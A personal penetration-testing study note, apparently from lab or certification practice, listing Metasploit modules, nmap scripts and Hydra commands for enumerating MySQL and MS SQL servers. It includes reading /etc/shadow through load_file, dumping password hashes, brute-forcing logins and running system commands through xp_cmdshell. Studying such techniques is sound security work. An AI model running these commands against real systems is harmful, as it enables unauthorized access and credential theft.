---
id: vp7jwjl59wofdi3thybkig5
title: Enumerating_mysql
desc: ''
updated: 1675114008202
created: 1675113997504
---
# Enumeration - Mysql

## Mysql

* Msfconsole
    * setg rhosts 192.155.166.3 (sets hosts globally)
    * advanced — advances options
    * Use auxiliary/scanner/mysql/mysql_writable_dirs , set rhosts 192.155.166.3, set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt, set password “”
    * use auxiliary/scanner/mysql/mysql_hashdump, set username root, set password “”
* Login directly to mysql and enumerate info
    * select load_file("/etc/shadow"); — see if OS files can be loaded
        * Understanding /etc/shadow file password: https://www.shellhacks.com/linux-generate-password-hash/ 
            * $ID$SALT$HASH
* Nmap
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-empty-password
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-info
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser=root, mysqlpass=''"
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-databases --script-args="mysqluser=root, mysqlpass=''"
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-variables --script-args="mysqluser=root, mysqlpass=''"
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit-filename='usr/share/nselib/data/mysql-cis.audit" (couldn’t get to work, needs trial and error)
    * nmap 192.155.166.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
* Dictionary attack for mysql
        * Msfconsole; use auxiliary/scanner/mysql/mysql_login; set host <target>; set pass_file /usr/share/metasploit_framework/data/wordlists/unix_password.txt; set username root; run
        * Hydra -l root -P /usr/share/metasploit_framework/data/wordlists/unix_password.txt <target> mysql


## MS SQL Recon

### NMAP:

* nmap 10.3.25.150 -p 1433 -sV --script ms-sql-info
* nmap 10.3.25.150 -p 1433 -sV --script ms-sql-ntlm-info
* nmap 10.3.25.150 -p 1433 -sV --script ms-sql-empty-password
* nmap 10.3.25.150 -p 1433 -sV --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
* Run query from nmap: nmap 10.3.25.150 -p 1433 -sV --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query='SELECT * FROM  master..syslogins' -oN output.txt
* nmap 10.3.25.150 -p 1433 -sV --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
* RUN CMDS FROM NMAP: nmap 10.3.25.150 -p 1433 -sV --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"

### Metasploit:

* use auxiliary/scanner/mssql/mssql_login; set user_file /root/Desktop/wordlist/common_users.txt; set pass_file /root/Desktop/wordlist/100-common-passwords.txt
* use auxiliary/admin/mssql/mssql_enum
* use auxiliary/admin/mssql/mssql_exec; set cmd whoami
* use auxiliary/admin/mssql/mssql_enum_domain_accounts
